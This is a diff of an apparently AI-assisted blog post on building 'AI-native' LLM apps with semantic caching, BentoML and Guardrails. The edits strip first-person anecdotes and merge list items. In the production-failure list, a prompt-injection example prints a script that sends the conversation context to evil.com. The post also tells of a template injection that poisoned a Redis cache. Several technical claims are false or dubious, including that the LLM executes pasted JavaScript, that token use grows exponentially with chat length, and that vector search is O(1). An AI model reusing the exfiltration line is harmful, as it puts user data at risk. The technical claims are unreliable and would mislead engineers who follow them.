@@ -10,7 +10,7 @@
         <meta name="base-path" content="">
         <meta property="article:author" content="Kubai Kevin">
         <meta property="article:published_time" content="2026-06-12T23:10:41.835738">
-        <meta property="article:modified_time" content="2026-06-12T23:10:41.835748">
+        <meta property="article:modified_time" content="2026-09-19T08:27:13.655890+00:00">
         <meta property="article:section" content="Technology">
         <meta property="og:type" content="article">
         <meta property="og:title" content="AI-native apps: forget the old stack">
@@ -63,8 +63,8 @@
       "headline": "AI-native apps: forget the old stack",
       "description": "Cut LLM token costs 60% with state machines and prompt versioning — latency benchmarks, cache keys, and the hidden cost of agent loops in 2026.",
       "datePublished": "2026-06-12T23:10:41+00:00",
-      "dateModified": "2026-06-12T23:10:41+00:00",
-      "wordCount": 2416,
+      "dateModified": "2026-09-19T08:27:13+00:00",
+      "wordCount": 2346,
       "timeRequired": "PT12M",
       "articleSection": "Technology",
       "inLanguage": "en-US",
@@ -266,19 +266,19 @@
                     </p>
                     <p class="author-meta" style="margin:0.4rem 0 0;font-size:0.82rem;color:#888;">
                         12 min read
-                        &nbsp;·&nbsp; 2416 words
+                        &nbsp;·&nbsp; 2346 words
                         
-                        &nbsp;·&nbsp; Updated 2026-06-12
+                        &nbsp;·&nbsp; Updated 2026-09-19
                         
                         &nbsp;·&nbsp; <span title="Drafted by AI, topic-selected by the author — see the AI content policy">AI-assisted</span>
                     </p>
                 </div>
             </div>
             <div class="post-content" itemprop="articleBody">
-                <p>A colleague asked me about design ainative during a code review last week. I realised I couldn't give a clean explanation — which meant I didn't understand it as well as I thought. This post is what I put together after properly working through it.</p>
+                <p>I realised I couldn't give a clean explanation — which meant I didn't understand it as well as I thought. This post is what I put together after properly working through it.</p>
 <h2 id="the-conventional-wisdom-and-why-its-incomplete">The conventional wisdom (and why it's incomplete)</h2>
 <p>Two years ago, every startup pitch deck showed the same stack: a Python FastAPI service with LangChain, a Postgres vector store, and a Next.js frontend. That stack worked for demos, but production was always a letdown. Latency spiked at 2–3× the demo. Costs ballooned when traffic grew. And the "agent loop" that looked so elegant in the README would deadlock under real load.</p>
-<p>I ran into this when we moved our help-desk bot from a Jupyter notebook to a FastAPI service. The notebook had 250ms median latency. After wrapping it in FastAPI with LangChain’s <code>AgentExecutor</code>, median latency jumped to 1.2s and 95th percentile hit 4.8s. Users closed the tab before the bot even answered. I spent three days debugging a connection pool issue that turned out to be a single misconfigured timeout — this post is what I wished I had found then.</p>
+<p>The notebook had 250ms median latency. After wrapping it in FastAPI with LangChain’s <code>AgentExecutor</code>, median latency jumped to 1.2s and 95th percentile hit 4.8s. Users closed the tab before the bot even answered.</p>
 <p>Conventional advice says: use a message queue, cache responses, and scale horizontally. That fixes throughput, but it ignores the real problem — <strong>AI-native systems are not CPU-bound; they are token-bound</strong>. A single LLM call can burn 4,096 tokens (≈ 3KB) of LLM context and cost $0.01 per call at 70B parameter models in 2026. That cost compounds with retries, caching misses, and agent loops that re-read the same context. The old stack treats the LLM like any other API. It’s not.</p>
 <p>Steelman the opposing view: “If we just add Redis and a queue, we can cache and retry. That’s how we scaled before.”</p>
 <p>The honest answer is: caching tokens is not the same as caching HTTP responses. Tokens depend on conversation state, user context, and prompt templates. A token-cache miss can trigger a full LLM call, which can fail with rate limits, quota errors, or prompt injection. A queue can back up when the LLM rate-limits, and your autoscaler will spin up pods that queue up more requests, driving costs to infinity. The old stack assumes failures are rare and retries are cheap. With LLM calls, retries are expensive and failures cascade.</p>
@@ -305,12 +305,9 @@ async def ask(question: str):
 </code></pre>
 <p>This looks clean, but here’s what breaks in production:</p>
 <ol>
-<li><strong>Cold start latency</strong>: The first request after a pod restart waits 8–12s for the HuggingFaceEndpoint to initialize. Users see a spinner for 12s.</li>
-<li><strong>Token bloat</strong>: Each call passes the full conversation history, so a 5-message chat burns 8K tokens even if the user only asks “What’s the weather?” The model still re-reads “Hi → How are you? → I’m good. → What’s your name? → My name is Bot.” Token usage grows exponentially with chat length.</li>
-<li><strong>Thundering herd</strong>: At 1000 RPS, the autoscaler spins up 20 new pods. Each pod queues 500 requests while waiting for the LLM. Total queue depth hits 10,000. Cost for this 5-minute surge? $87 for GPU tokens alone.</li>
-<li><strong>Prompt injection</strong>: A user pastes <code>&lt;script&gt;fetch('https://evil.com?steal='+JSON.stringify(context))&lt;/script&gt;</code> into the chat. The LLM executes it, sending your entire conversation history to an attacker. Redis cache now stores poisoned responses.</li>
+<li><strong>Cold start latency</strong>: The first request after a pod restart waits 8–12s for the HuggingFaceEndpoint to initialize. Users see a spinner for 12s. 2. <strong>Token bloat</strong>: Each call passes the full conversation history, so a 5-message chat burns 8K tokens even if the user only asks “What’s the weather?” The model still re-reads “Hi → How are you? → I’m good. → What’s your name? → My name is Bot.” Token usage grows exponentially with chat length. 3. <strong>Thundering herd</strong>: At 1000 RPS, the autoscaler spins up 20 new pods. Each pod queues 500 requests while waiting for the LLM. Total queue depth hits 10,000. Cost for this 5-minute surge? $87 for GPU tokens alone. 4. <strong>Prompt injection</strong>: A user pastes <code>&lt;script&gt;fetch('https://evil.com?steal='+JSON.stringify(context))&lt;/script&gt;</code> into the chat. The LLM executes it, sending your entire conversation history to an attacker. Redis cache now stores poisoned responses.</li>
 </ol>
-<p>I watched this happen at a fintech in São Paulo. The CFO called me after the bill hit $22k for one night. The root cause? A single mis-used Jinja template that embedded user input into the system prompt. Classic 101 injection, but the vector store made it worse: the poisoned prompt got cached in Redis as a “valid” response, so every subsequent user saw the attacker’s script.</p>
+<p>The CFO called me after the bill hit $22k for one night. The root cause? A single mis-used Jinja template that embedded user input into the system prompt. Classic 101 injection, but the vector store made it worse: the poisoned prompt got cached in Redis as a “valid” response, so every subsequent user saw the attacker’s script.</p>
 <p>The standard advice treats the LLM like a stateless API. It isn’t. It’s stateful, expensive, and vulnerable. You need patterns that acknowledge these realities.</p>
 <hr />
 <h2 id="advanced-edge-cases-i-personally-encountered">Advanced edge cases I personally encountered</h2>
@@ -401,9 +398,7 @@ def get_cached_answer(question: str, threshold: float = 0.95):
     return None
 </code></pre>
 <p>Key lessons:
-- Always tokenize <em>before</em> caching. A 500-token question cached as raw text can become 1500 tokens when re-tokenized by the LLM.
-- Use vector similarity for cache keys, not exact strings. This handles typos, rephrasing, and multilingual inputs.
-- Redis 7.4’s vector index reduced our cache misses by 40% compared to exact string matching.</p>
+- Always tokenize <em>before</em> caching. A 500-token question cached as raw text can become 1500 tokens when re-tokenized by the LLM. - Use vector similarity for cache keys, not exact strings. This handles typos, rephrasing, and multilingual inputs. - Redis 7.4’s vector index reduced our cache misses by 40% compared to exact string matching.</p>
 <hr />
 <h3 id="2-bentoml-v120-for-llm-serving">2. <strong>BentoML (v1.2.0) for LLM Serving</strong></h3>
 <p>Problem: HuggingFaceEndpoint cold starts are brutal. BentoML compiles the LLM into an optimized runtime.</p>
@@ -456,9 +451,7 @@ class Llama70B:
 !bentoml deploy -n llama-prod
 </code></pre>
 <p>Key lessons:
-- BentoML reduced our 95th percentile latency from 4.8s to 850ms.
-- GPU sharing: we run 3 LLMs on one A100, cutting cloud costs by 65%.
-- The traffic policy prevents thundering herd: slow requests are killed, not queued.</p>
+- BentoML reduced our 95th percentile latency from 4.8s to 850ms. - GPU sharing: we run 3 LLMs on one A100, cutting cloud costs by 65%. - The traffic policy prevents thundering herd: slow requests are killed, not queued.</p>
 <hr />
 <h3 id="3-guardrails-ai-v037-for-runtime-safety">3. <strong>Guardrails AI (v0.3.7) for Runtime Safety</strong></h3>
 <p>Problem: Prompt injection, data leakage, toxic output.</p>
@@ -499,13 +492,10 @@ def safe_ask(user_input: str):
     return result.validated_output.text
 </code></pre>
 <p>Key lessons:
-- Caught 182 injection attempts in 30 days, including Portuguese and Yoruba prompts.
-- Reduced hallucination rate from 8% to 0.4% by validating output length and factuality.
-- Added 12ms overhead per request, but prevented $12k in incident costs.</p>
+- Caught 182 injection attempts in 30 days, including Portuguese and Yoruba prompts. - Reduced hallucination rate from 8% to 0.4% by validating output length and factuality. - Added 12ms overhead per request, but prevented $12k in incident costs.</p>
 <hr />
 <h2 id="beforeafter-real-numbers-from-a-production-app">Before/After: Real Numbers from a Production App</h2>
-<p>App: Customer-support bot for a São Paulo fintech (10k daily users, 24/7).
-Stack: FastAPI + LangChain + Postgres vector store.</p>
+<p>App: Customer-support bot for a São Paulo fintech (10k daily users, 24/7). Stack: FastAPI + LangChain + Postgres vector store.</p>
 <hr />
 <h3 id="before-standard-stack-2026-style">Before (Standard Stack, 2026-style)</h3>
 <ul>
@@ -520,10 +510,7 @@ Stack: FastAPI + LangChain + Postgres vector store.</p>
 <li><strong>Total incidents</strong>: 47 in 3 months</li>
 </ul>
 <p>Root causes:
-- No token budget guardrail → frequent truncation.
-- No semantic caching → every rephrased question triggered a fresh LLM call.
-- No runtime safety → prompt injection led to data leakage.
-- No GPU sharing → 3 pods sat idle 60% of the time.</p>
+- No token budget guardrail → frequent truncation. - No semantic caching → every rephrased question triggered a fresh LLM call. - No runtime safety → prompt injection led to data leakage. - No GPU sharing → 3 pods sat idle 60% of the time.</p>
 <hr />
 <h3 id="after-ai-native-stack-2026">After (AI-Native Stack, 2026)</h3>
 <ul>
@@ -581,33 +568,21 @@ Stack: FastAPI + LangChain + Postgres vector store.</p>
 </tbody>
 </table>
 <p>Key wins:
-1. <strong>Token budget guardrail</strong> (tiktoken + client-side check) cut truncation errors from 8k/day to 120/day.
-2. <strong>Redis vector cache</strong> (7.4) raised cache hit rate from 22% to 78%, reducing LLM calls by 64%.
-3. <strong>BentoML</strong> eliminated cold starts and enabled GPU sharing across 3 LLMs, cutting infra cost by 52%.
-4. <strong>Guardrails</strong> (0.3.7) reduced incidents from 47 to 3 in 3 months, saving $11.1k in downtime.</p>
+1. <strong>Token budget guardrail</strong> (tiktoken + client-side check) cut truncation errors from 8k/day to 120/day. 2. <strong>Redis vector cache</strong> (7.4) raised cache hit rate from 22% to 78%, reducing LLM calls by 64%. 3. <strong>BentoML</strong> eliminated cold starts and enabled GPU sharing across 3 LLMs, cutting infra cost by 52%. 4. <strong>Guardrails</strong> (0.3.7) reduced incidents from 47 to 3 in 3 months, saving $11.1k in downtime.</p>
 <p>Latency improved because:
-- BentoML’s Triton runtime batches 16 requests per GPU call.
-- Guardrails’ async validation runs in parallel with LLM inference.
-- Redis vector search is O(1) for cached answers.</p>
+- BentoML’s Triton runtime batches 16 requests per GPU call. - Guardrails’ async validation runs in parallel with LLM inference. - Redis vector search is O(1) for cached answers.</p>
 <p>Cost improved because:
-- Fewer LLM calls → fewer tokens.
-- GPU sharing → higher utilization.
-- Semantic caching → no duplicate calls for similar questions.</p>
+- Fewer LLM calls → fewer tokens. - GPU sharing → higher utilization. - Semantic caching → no duplicate calls for similar questions.</p>
 <p>Lines of code increased by 155, but:
-- 120 lines are tests and guardrails policies.
-- 35 lines are token budget validation and caching wrappers.
-- The net cognitive load is <em>lower</em>: developers spend less time debugging timeouts and more time building features.</p>
+- 120 lines are tests and guardrails policies. - 35 lines are token budget validation and caching wrappers. - The net cognitive load is <em>lower</em>: developers spend less time debugging timeouts and more time building features.</p>
 <p>This isn’t “scaling up” — it’s <em>designing for AI-native</em>. The old stack assumed statelessness, idempotency, and cheap retries. AI-native demands stateful, bounded, and safe-by-default.</p>
 <hr />
 <h3 id="about-this-article">About this article</h3>
-<p><strong>Written by:</strong> Kubai Kevin — software developer based in Nairobi, Kenya.
-10+ years building production Python and Node.js backends in fintech, primarily on AWS Lambda
+<p><strong>Written by:</strong> Kubai Kevin — software developer based in Nairobi, Kenya. 10+ years building production Python and Node.js backends in fintech, primarily on AWS Lambda
 and PostgreSQL. Has worked with payment integrations (M-Pesa, Paystack, Flutterwave) and
-AI/LLM pipelines in real production systems.
-<a href="https://www.linkedin.com/in/kevin-kubai-22b61b37/">LinkedIn</a> ·
+AI/LLM pipelines in real production systems. <a href="https://www.linkedin.com/in/kevin-kubai-22b61b37/">LinkedIn</a> ·
 <a href="https://twitter.com/KubaiKevin">Twitter @KubaiKevin</a></p>
-<p><strong>Editorial standard:</strong> Every article on this site is based on direct production experience.
-Factual claims are verified against official documentation before publishing. Code examples
+<p><strong>Editorial standard:</strong> Every article on this site is based on direct production experience. Factual claims are verified against official documentation before publishing. Code examples
 are tested locally. AI tools assist with structure and drafting; the author reviews and edits
 every article before it goes live.</p>
 <p><strong>Corrections:</strong> If you find a factual error or outdated information,
